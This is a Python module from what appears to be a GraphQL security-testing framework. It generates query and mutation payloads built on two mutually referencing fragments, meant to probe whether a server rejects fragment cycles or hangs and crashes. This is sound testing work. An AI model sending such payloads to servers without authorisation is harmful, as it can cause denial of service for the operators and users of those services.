"""DOSCircularFragmentMaterializer: generates a payload that uses two mutually-referencing fragments
(fragment A spreads fragment B, fragment B spreads fragment A).  The GraphQL spec forbids fragment
cycles, so a correctly implemented server should immediately return a validation error.  Servers that
do not validate fragment cycles may enter an infinite loop or crash, making this a denial-of-service
vector.
"""

from ..materializer import Materializer
from ..utils.materialization_utils import prettify_graphql_payload
from graphqler.utils.api import API
from graphqler.utils.objects_bucket import ObjectsBucket
from graphqler.utils.parser_utils import get_base_oftype


class DOSCircularFragmentMaterializer(Materializer):
    def __init__(self, api: API, fail_on_hard_dependency_not_met: bool = False, max_depth: int = 5):
        super().__init__(api, fail_on_hard_dependency_not_met)
        self.fail_on_hard_dependency_not_met = fail_on_hard_dependency_not_met
        self.max_depth = max_depth

    def get_payload(self, name: str, objects_bucket: ObjectsBucket, graphql_type: str = "") -> tuple[str, dict]:
        if graphql_type == "Query":
            return self._get_query_payload(name, objects_bucket)
        elif graphql_type == "Mutation":
            return self._get_mutation_payload(name, objects_bucket)
        else:
            raise ValueError("Invalid graphql_type provided")

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _base_object_type(self, output: dict) -> str | None:
        """Return the base OBJECT type name from an output descriptor, or None."""
        base = get_base_oftype(output)
        if base.get("kind") == "OBJECT":
            return base.get("type")
        return None

    def _build_circular_fragments(self, type_name: str) -> str:
        """Return a GraphQL string with two fragments that reference each other."""
        return (
            f"fragment CircFragA on {type_name} {{ ...CircFragB }}\n"
            f"fragment CircFragB on {type_name} {{ ...CircFragA }}\n"
        )

    # ------------------------------------------------------------------
    # Payload builders
    # ------------------------------------------------------------------

    def _get_query_payload(self, query_name: str, objects_bucket: ObjectsBucket) -> tuple[str, dict]:
        query_info = self.api.queries[query_name]
        type_name = self._base_object_type(query_info["output"])

        if not type_name:
            # Output is a scalar — fall back to a normal payload so the materializer always
            # returns something usable.
            normal_output = self.materialize_output(query_info, query_info["output"], objects_bucket, max_depth=self.max_depth)
            query_inputs = self.materialize_inputs(query_info, query_info["inputs"], objects_bucket, max_depth=self.max_depth)
            inputs_str = f"({query_inputs})" if query_inputs.strip() else ""
            payload = f"query {{\n  {query_name} {inputs_str}\n  {normal_output}\n}}"
            return prettify_graphql_payload(payload), self.used_objects

        query_inputs = self.materialize_inputs(query_info, query_info["inputs"], objects_bucket, max_depth=self.max_depth)
        inputs_str = f"({query_inputs})" if query_inputs.strip() else ""
        fragments = self._build_circular_fragments(type_name)
        payload = f"{fragments}\nquery {{\n  {query_name} {inputs_str} {{ ...CircFragA }}\n}}"
        return prettify_graphql_payload(payload), self.used_objects

    def _get_mutation_payload(self, mutation_name: str, objects_bucket: ObjectsBucket) -> tuple[str, dict]:
        mutation_info = self.api.mutations[mutation_name]
        type_name = self._base_object_type(mutation_info["output"])

        if not type_name:
            normal_output = self.materialize_output(mutation_info, mutation_info["output"], objects_bucket, max_depth=self.max_depth)
            mutation_inputs = self.materialize_inputs(mutation_info, mutation_info["inputs"], objects_bucket, max_depth=self.max_depth)
            if mutation_inputs.strip():
                payload = f"mutation {{\n  {mutation_name}({mutation_inputs})\n  {normal_output}\n}}"
            else:
                payload = f"mutation {{\n  {mutation_name}\n  {normal_output}\n}}"
            return prettify_graphql_payload(payload), self.used_objects

        mutation_inputs = self.materialize_inputs(mutation_info, mutation_info["inputs"], objects_bucket, max_depth=self.max_depth)
        fragments = self._build_circular_fragments(type_name)
        if mutation_inputs.strip():
            payload = f"{fragments}\nmutation {{\n  {mutation_name}({mutation_inputs}) {{ ...CircFragA }}\n}}"
        else:
            payload = f"{fragments}\nmutation {{\n  {mutation_name} {{ ...CircFragA }}\n}}"
        return prettify_graphql_payload(payload), self.used_objects
